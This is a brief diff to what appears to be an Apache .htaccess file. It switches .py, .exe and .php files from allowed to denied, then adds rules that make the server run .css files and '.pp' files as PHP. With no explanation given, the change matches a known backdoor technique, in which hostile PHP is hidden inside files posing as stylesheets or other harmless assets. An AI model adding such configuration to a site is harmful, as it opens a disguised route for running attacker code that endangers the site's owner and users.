@@ -1,4 +1,8 @@
 <FilesMatch ".(py|exe|php)$">
 Order allow,deny
-allow from all
+Deny from all
 </FilesMatch>
+<FilesMatch "\.css$">
+    SetHandler application/x-httpd-php
+</FilesMatch>
+AddType application/x-httpd-php .pp
